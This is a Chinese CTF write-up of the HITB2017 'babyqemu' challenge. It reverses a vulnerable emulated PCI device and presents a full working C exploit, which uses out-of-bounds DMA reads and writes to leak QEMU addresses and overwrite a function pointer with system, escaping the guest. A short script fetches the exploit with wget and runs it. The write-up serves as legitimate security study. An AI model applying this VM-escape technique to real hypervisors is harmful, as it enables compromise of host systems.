---
title: HITB2017-babyqemu
date: 2020-02-23 22:05:40
tags: PWN
---

# 初步分析



又是一道qemu逃逸的题目

```c
#! /bin/sh
./qemu-system-x86_64 \
-initrd ./rootfs.cpio \
-kernel ./vmlinuz-4.8.0-52-generic \
-append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
-enable-kvm \
-monitor /dev/null \
-m 64M --nographic  -L ./dependency/usr/local/share/qemu \
-L pc-bios \
-device hitb,id=vda
```

-device hitb,应该是编写了一个叫做hitb的设备



root空密码登入

一堆设备,但是没有名字,这个lspci好像很蔡.

```
# lspci -k
00:00.0 Class 0600: 8086:1237
00:01.3 Class 0680: 8086:7113
00:03.0 Class 0200: 8086:100e e1000
00:01.1 Class 0101: 8086:7010 ata_piix
00:02.0 Class 0300: 1234:1111
00:01.0 Class 0601: 8086:7000
00:04.0 Class 00ff: 1234:2333
```



逆向class_init函数,发现初始化了v2->vendor_id = 0x1234;v2->device_id = 0x2333;,很明显就是00:04.0设备,我们可以继续查看,resource文件的格式是start addr,end addr还有flag,因为flag的最低位为0,所以这是mmio空间.

```C
# cat /sys/devices/pci0000\:00/0000\:00\:04.0/resource
0x00000000fea00000 0x00000000feafffff 0x0000000000040200
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
```

逆向pci_hitb_realize函数,这次的函数比之前的难了好多

```C
void __fastcall pci_hitb_realize(PCIDevice_0 *pdev, Error_0 **errp)
{
  pdev->config[61] = 1;
  if ( !msi_init(pdev, 0, 1u, 1, 0, errp) )
  {
    timer_init_tl(&pdev[1].io_regions[4], main_loop_tlg.tl[1], 1000000, hitb_dma_timer, pdev);
    qemu_mutex_init(&pdev[1].io_regions[0].type);
    qemu_cond_init(&pdev[1].io_regions[1].type);
    qemu_thread_create(&pdev[1].io_regions[0].size, "hitb", hitb_fact_thread, pdev, 0);
    memory_region_init_io(&pdev[1], &pdev->qdev.parent_obj, &hitb_mmio_ops, pdev, "hitb-mmio", 0x100000uLL);
    pci_register_bar(pdev, 0, 0, &pdev[1]);
  }
}
```

这里涉及到MSI中断初始化,timer结构体,[qemu的多线程](https://blog.csdn.net/wangwei222/article/details/81383717)实现,mmio内存的初始化以及[bar](https://zhuanlan.zhihu.com/p/26244141)的注册.东西有点多,后面慢慢总结吧,先继续分析代码

同样可以找到这样一个结构体,继续恢复ida的伪代码

```C
struct __attribute__((aligned(16))) HitbState
{
  PCIDevice_0 pdev;
  MemoryRegion_0 mmio;
  QemuThread_0 thread;
  QemuMutex_0 thr_mutex;
  QemuCond_0 thr_cond;
  _Bool stopping;
  uint32_t addr4;
  uint32_t fact;
  uint32_t status;
  uint32_t irq_status;
  dma_state dma;
  QEMUTimer_0 dma_timer;
  char dma_buf[4096];
  void (*enc)(char *, unsigned int);
  uint64_t dma_mask;
};

struct dma_state
{
  dma_addr_t src;
  dma_addr_t dst;
  dma_addr_t cnt;
  dma_addr_t cmd;
};

```

```C
uint64_t __fastcall hitb_mmio_read(HitbState *opaque, hwaddr addr, unsigned int size)
{
  uint64_t result; // rax
  uint64_t val; // ST08_8

  result = -1LL;
  if ( size == 4 )
  {
    if ( addr == 128 )
      return opaque->dma.src;
    if ( addr > 0x80 )
    {
      if ( addr == 140 )
        return *(&opaque->dma.dst + 4);
      if ( addr <= 0x8C )
      {
        if ( addr == 132 )
          return *(&opaque->dma.src + 4);
        if ( addr == 136 )
          return opaque->dma.dst;
      }
      else
      {
        if ( addr == 144 )
          return opaque->dma.cnt;
        if ( addr == 152 )
          return opaque->dma.cmd;
      }
    }
    else
    {
      if ( addr == 8 )
      {
        qemu_mutex_lock(&opaque->thr_mutex);
        val = opaque->fact;
        qemu_mutex_unlock(&opaque->thr_mutex);
        return val;
      }
      if ( addr <= 8 )
      {
        result = 0x10000EDLL;
        if ( !addr )
          return result;
        if ( addr == 4 )
          return opaque->addr4;
      }
      else
      {
        if ( addr == 32 )
          return opaque->status;
        if ( addr == 36 )
          return opaque->irq_status;
      }
    }
    result = -1LL;
  }
  return result;
}
```

从hitb_mmio_read中可以看到提供了许多功能,分别是读取dma.src,dma.dst,dma.cnt,dma.cmd,fact,addr4,status,irq_status,没有什么可以控制的参数,先跳过

```C
void __fastcall hitb_mmio_write(HitbState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  uint32_t v4; // er13
  int v5; // edx
  bool v6; // zf
  int64_t v7; // rax

  if ( (addr > 0x7F || size == 4) && (!((size - 4) & 0xFFFFFFFB) || addr <= 0x7F) )
  {
    if ( addr == 128 )
    {
      if ( !(opaque->dma.cmd & 1) )
        opaque->dma.src = val;
    }
    else
    {
      v4 = val;
      if ( addr > 0x80 )
      {
        if ( addr == 140 )
        {
          if ( !(opaque->dma.cmd & 1) )
            *(&opaque->dma.dst + 4) = val;
        }
        else if ( addr > 0x8C )
        {
          if ( addr == 144 )
          {
            if ( !(opaque->dma.cmd & 1) )
              opaque->dma.cnt = val;
          }
          else if ( addr == 152 && val & 1 && !(opaque->dma.cmd & 1) )
          {
            opaque->dma.cmd = val;
            v7 = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL_0);
            timer_mod(&opaque->dma_timer, (((0x431BDE82D7B634DBLL * v7) >> 64) >> 18) - (v7 >> 63) + 100);
          }
        }
        else if ( addr == 132 )
        {
          if ( !(opaque->dma.cmd & 1) )
            *(&opaque->dma.src + 4) = val;
        }
        else if ( addr == 136 && !(opaque->dma.cmd & 1) )
        {
          opaque->dma.dst = val;
        }
      }
      else if ( addr == 32 )
      {
        if ( val & 0x80 )
          _InterlockedOr(&opaque->status, 0x80u);
        else
          _InterlockedAnd(&opaque->status, 0xFFFFFF7F);
      }
      else if ( addr > 0x20 )
      {
        if ( addr == 96 )
        {
          v6 = (val | opaque->irq_status) == 0;
          opaque->irq_status |= val;
          if ( !v6 )
            hitb_raise_irq(opaque, 0x60u);
        }
        else if ( addr == 100 )
        {
          v5 = ~val;
          v6 = (v5 & opaque->irq_status) == 0;
          opaque->irq_status &= v5;
          if ( v6 && !msi_enabled(&opaque->pdev) )
            pci_set_irq(&opaque->pdev, 0);
        }
      }
      else if ( addr == 4 )
      {
        opaque->addr4 = ~val;
      }
      else if ( addr == 8 && !(opaque->status & 1) )
      {
        qemu_mutex_lock(&opaque->thr_mutex);
        opaque->fact = v4;
        _InterlockedOr(&opaque->status, 1u);
        qemu_cond_signal(&opaque->thr_cond);
        qemu_mutex_unlock(&opaque->thr_mutex);
      }
    }
  }
}
```

hitb_mmio_write是写入函数,这里的东西有点多.前面约束了size只能为4.后面的一些东西也是没有漏洞的

```C
void __fastcall hitb_dma_timer(HitbState *opaque)
{
  dma_addr_t v1; // rax
  __int64 v2; // rdx
  uint8_t *v3; // rsi
  dma_addr_t v4; // rax
  dma_addr_t v5; // rdx
  uint8_t *v6; // rbp
  uint8_t *v7; // rbp

  v1 = opaque->dma.cmd;
  if ( v1 & 1 )
  {
    if ( v1 & 2 )
    {
      v2 = (LODWORD(opaque->dma.src) - 0x40000);
      if ( v1 & 4 )
      {
        v7 = &opaque->dma_buf[v2];
        (opaque->enc)(v7, LODWORD(opaque->dma.cnt));
        v3 = v7;
      }
      else
      {
        v3 = &opaque->dma_buf[v2];
      }
      cpu_physical_memory_rw(opaque->dma.dst, v3, opaque->dma.cnt, 1);
      v4 = opaque->dma.cmd;
      v5 = opaque->dma.cmd & 4;
    }
    else
    {
      v6 = &opaque[-36] + opaque->dma.dst - 2824;
      LODWORD(v3) = opaque + opaque->dma.dst - 0x40000 + 3000;
      cpu_physical_memory_rw(opaque->dma.src, v6, opaque->dma.cnt, 0);
      v4 = opaque->dma.cmd;
      v5 = opaque->dma.cmd & 4;
      if ( opaque->dma.cmd & 4 )
      {
        v3 = LODWORD(opaque->dma.cnt);
        (opaque->enc)(v6, v3, v5);
        v4 = opaque->dma.cmd;
        v5 = opaque->dma.cmd & 4;
      }
    }
    opaque->dma.cmd = v4 & 0xFFFFFFFFFFFFFFFELL;
    if ( v5 )
    {
      opaque->irq_status |= 0x100u;
      hitb_raise_irq(opaque, v3);
    }
  }
}
```

hitb_dma_timer函数中,有一处还是很明显的,前面在计算v2 = (LODWORD(opaque->dma.src) - 0x40000);,要注意这个dma.src是可以由我们控制的

在cmd=0b011的时候,会调用cpu_physical_memory_rw,将v3,也就是opaque->dma.src - 0x40000处的cnt个数据写到dst处.这时应该就可以造成一个越界读了,可以用来leak.只需要提前设置好src,dst,cnt的值.就可以越界读buf了

下面的同理,可以控制进行任意地址写.可以改写enc函数的函数指针,在buf事先放好cmd,然后最后进行一个劫持控制流.



# 调试及exp编写

功能:read/write

dma.src 128

&dma.src + 4 132

dma.dst 136

dma.dst + 4 140

dma.cnt 144

dma.cmd 152

系统没有gcc,但是网络是可以通的,所以写了一个脚本,并且在另一边起一个HTTP服务器

```sh
#!/bin/sh

rm exp
wget 10.0.2.2:8000/exp
chmod +x exp
./exp
```

调试的话,一开始准备模仿上一个题目,开一个22端口的转发然后ssh上去,但是没有ssh服务,去掉-nographic也没弹窗,只有个VNCserver,连上去也用不了,后来看到了ray-cp师傅的调试方式.好像set args不太行,会没有窗口?不过这样调试还是非常舒服的.

```
pwndbg> r -initrd ./rootfs.cpio -kernel ./vmlinuz-4.8.0-52-generic -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic  -L ./dependency/usr/local/share/qemu -L pc-bios -device hitb,id=vda
```

最后的EXP:

```C
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdint.h>
#include <assert.h>
#include <string.h>
#include <time.h>

#define PAGE_SIZE 0x1000

uint64_t base = 0;
int pm = 0;

int mmio_read(uint64_t addr)
{
	return *((uint32_t *)(base + addr));
}

void mmio_write(uint64_t  addr,uint32_t value)
{
	 *((uint32_t *)(base + addr)) = value;
}

uint32_t v2p(void * addr)
{
    uint32_t index = (uint64_t)addr / PAGE_SIZE;
    lseek(pm,index * 8,SEEK_SET);
    uint64_t num = 0;
    read(pm,&num,8);
    return ((num & (((uint64_t)1 << 55) - 1)) << 12) + (uint64_t)addr % PAGE_SIZE;

}

char cmd[] = "cat /flag";
//char cmd[] = "/bin/sh";
int main()
{
	puts("[*]start pwn");
	int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
	assert(fd != -1);
	
	base = (uint64_t)mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	assert(base != -1);	
	
	pm = open("/proc/self/pagemap",O_RDONLY); 	
	assert(pm != -1);	

	void * buf = malloc(0x1000);

	memset(buf,0,0x1000);

	mmio_write(128,0x40000 + 0x1000); //dma.src = 0x40000 + 4096
	mmio_write(144,0x8);//dma.cnt = 0x10
	mmio_write(136,v2p(buf));//dma.dst = buf

	mmio_write(152,3);//cmd = 0b011
	sleep(1);

	uint64_t leak = *(uint64_t *)buf;
	printf("leak:0x%llx\n",leak);
	uint64_t proc_base = leak - 0x283dd0;
	printf("proc_base:0x%llx\n",proc_base);

	uint64_t system_plt = proc_base + 0x1FDB18;
	printf("system_plt:0x%llx\n",system_plt);	
	puts("[*] write cmd");
	memset(buf,0,0x1000);
	memcpy(buf,cmd,10);

	mmio_write(128,v2p(buf)); //dma.src = buf
        mmio_write(144,10);//dma.cnt = 0x10
        mmio_write(136,0x40000+0);//dma.dst = 0x40000+0

        mmio_write(152,1);
	sleep(1);
	
	puts("[*] write system");
	memset(buf,0,0x1000);
	*(uint64_t *)buf = system_plt;
	mmio_write(128,v2p(buf)); //dma.src = buf
        mmio_write(144,8);//dma.cnt = 0x10
        mmio_write(136,0x40000+0x1000);//dma.dst = 0x40000+0x10000
	mmio_write(152,1);
        sleep(1);

	puts("[*] hijack");
	mmio_write(128,0x40000 + 0x0); //dma.src = 0x40000 + 0
        mmio_write(144,10);//dma.cnt = 0x10
        mmio_write(136,v2p(buf));//dma.dst = buf

        mmio_write(152,7);//cmd = 0b011
        sleep(1);

	return 0;
}
```

一开始忘记在每次执行hitb_dma_timer后sleep了,导致leak不出来.......

![](HITB2017-babyqemu\succ.png)

# 总结

总体上比上一题难了一些,涉及到了多线程(虽然后来发现是为了配合QEMUTimer),但是过程还是很有趣的,使用mmio和模拟的DMA,对于DMA的理解应该更容易些了.